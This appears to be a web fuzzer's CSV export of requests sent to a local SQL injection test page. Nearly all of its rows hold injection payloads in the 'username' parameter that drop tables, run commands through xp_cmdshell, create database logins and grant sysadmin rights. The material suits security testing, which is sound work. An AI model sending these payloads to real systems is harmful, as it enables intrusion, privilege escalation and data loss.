Identificación de pestaña,Tipo de mensaje,Petición (Tiempo),Método,URL,Código,Razón,RTT,Tamaño de la Cabecera de Pregunta,Tamaño Cuerpo de Petición,Tamaño de la Cabecera de Respuesta,Respuesta (Tamaño del cuerpo),Alerta mayor,Estado,Cargas Útiles
0,Original,Wed Sep 10 16:45:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=prueba&password=prueba,200,OK,18,456,0,228,345,Medio,,[]
2,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=create%20user%20name%20identified%20by%20'pass123'&password=prueba,200,OK,31,500,0,228,461,,,[create user name identified by 'pass123']
1,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=';%20exec%20master..xp_cmdshell%20'ping%2010.10.1.2'--&password=prueba,200,OK,45,504,0,228,496,,,['; exec master..xp_cmdshell 'ping 10.10.1.2'--]
3,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=create%20user%20name%20identified%20by%20pass123%20temporary%20tablespace%20temp%20default%20tablespace%20users;%20&password=prueba,200,OK,42,565,0,228,345,,,[create user name identified by pass123 temporary tablespace temp default tablespace users; ]
4,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20;%20drop%20table%20temp%20--&password=prueba,200,OK,33,482,0,228,471,,,[' ; drop table temp --]
6,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=exec%20sp_addsrvrolemember%20'name'%20,%20'sysadmin'&password=prueba",200,OK,9,502,0,227,471,,,"[exec sp_addsrvrolemember 'name' , 'sysadmin']"
7,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=insert%20into%20mysql.user%20(user,%20host,%20password)%20values%20('name',%20'localhost',%20password('pass123'))&password=prueba",200,OK,4,563,0,227,493,,,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123'))]"
5,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=exec%20sp_addlogin%20'name'%20,%20'password'&password=prueba",200,OK,9,494,0,227,471,,,"[exec sp_addlogin 'name' , 'password']"
10,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=';%20exec%20master..xp_cmdshell%20'ping%2010.10.1.2'--&password=prueba,200,OK,8,504,0,227,496,,,['; exec master..xp_cmdshell 'ping 10.10.1.2'--]
9,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=insert%20into%20users(login,%20password,%20level)%20values(%20char(0x70)%20+%20char(0x65)%20+%20char(0x74)%20+%20char(0x65)%20+%20char(0x72)%20+%20char(0x70)%20+%20char(0x65)%20+%20char(0x74)%20+%20char(0x65)%20+%20char(0x72),char(0x64)&password=prueba",200,OK,10,686,0,227,345,,,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)]"
11,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=create%20user%20name%20identified%20by%20'pass123'&password=prueba,200,OK,8,500,0,227,461,,,[create user name identified by 'pass123']
14,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,"http://localtest/sqli_test/index.php?username=exec%20sp_addlogin%20'name'%20,%20'password'&password=prueba",200,OK,4,494,0,227,471,,,"[exec sp_addlogin 'name' , 'password']"
13,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username='%20;%20drop%20table%20temp%20--&password=prueba,200,OK,4,482,0,227,471,,,[' ; drop table temp --]
8,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=grant%20connect%20to%20name;%20grant%20resource%20to%20name;&password=prueba,200,OK,17,510,0,227,345,,,[grant connect to name; grant resource to name;]
12,Fuzzed,Wed Sep 10 16:48:26 CEST 2025,GET,http://localtest/sqli_test/index.php?username=create%20user%20name%20identified%20by%20pass123%20temporary%20tablespace%20temp%20default%20tablespace%20users;%20&password=prueba,200,OK,4,565,0,227,345,,,[create user name identified by pass123 temporary tablespace temp default tablespace users; ]
